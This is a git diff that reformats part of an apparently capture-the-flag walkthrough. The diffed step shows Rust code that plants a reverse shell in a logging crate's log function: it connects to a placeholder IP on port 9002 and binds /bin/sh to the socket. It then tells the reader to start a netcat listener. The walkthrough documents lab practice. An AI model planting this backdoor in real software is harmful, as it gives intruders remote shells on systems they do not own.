@@ -154,51 +154,51 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 
 1. Edit `/opt/crates/logger/src/logger.rs` and insert the code for a reverse shell
     - https://stackoverflow.com/questions/48958814/what-is-the-rust-equivalent-of-a-reverse-shell-script-written-in-python
-    <details>
-    <summary>modified <code>logger.rs</code></summary>
-    
-    ```rust
-    extern crate chrono;
+    - <details>
+        <summary>modified <code>logger.rs</code></summary>
+        
+        ```rust
+        extern crate chrono;
 
-    use std::fs::OpenOptions;
-    use std::io::Write;
-    use chrono::prelude::*;
-    use std::net::TcpStream;
-    use std::os::unix::io::{AsRawFd, FromRawFd};
-    use std::process::{Command, Stdio};
+        use std::fs::OpenOptions;
+        use std::io::Write;
+        use chrono::prelude::*;
+        use std::net::TcpStream;
+        use std::os::unix::io::{AsRawFd, FromRawFd};
+        use std::process::{Command, Stdio};
 
-    pub fn log(user: &str, query: &str, justification: &str) {
-        let s = TcpStream::connect("<your ip>:9002").unwrap();
-        let fd = s.as_raw_fd();
-        Command::new("/bin/sh")
-            .arg("-i")
-            .stdin(unsafe { Stdio::from_raw_fd(fd) })
-            .stdout(unsafe { Stdio::from_raw_fd(fd) })
-            .stderr(unsafe { Stdio::from_raw_fd(fd) })
-            .spawn()
-            .unwrap()
-            .wait()
-            .unwrap();
+        pub fn log(user: &str, query: &str, justification: &str) {
+            let s = TcpStream::connect("<your ip>:9002").unwrap();
+            let fd = s.as_raw_fd();
+            Command::new("/bin/sh")
+                .arg("-i")
+                .stdin(unsafe { Stdio::from_raw_fd(fd) })
+                .stdout(unsafe { Stdio::from_raw_fd(fd) })
+                .stderr(unsafe { Stdio::from_raw_fd(fd) })
+                .spawn()
+                .unwrap()
+                .wait()
+                .unwrap();
 
-        let now = Local::now();
-        let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
-        let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
+            let now = Local::now();
+            let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
+            let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
 
-        let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
-            Ok(file) => file,
-            Err(e) => {
-                println!("Error opening log file: {}", e);
-                return;
+            let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
+                Ok(file) => file,
+                Err(e) => {
+                    println!("Error opening log file: {}", e);
+                    return;
+                }
+            };
+
+            if let Err(e) = file.write_all(log_message.as_bytes()) {
+                println!("Error writing to log file: {}", e);
             }
-        };
-
-        if let Err(e) = file.write_all(log_message.as_bytes()) {
-            println!("Error writing to log file: {}", e);
         }
-    }
-    ```
-    
-    </details>
+        ```
+        
+        </details>
 
 
 2. Start a reverse shell listener using netcat:
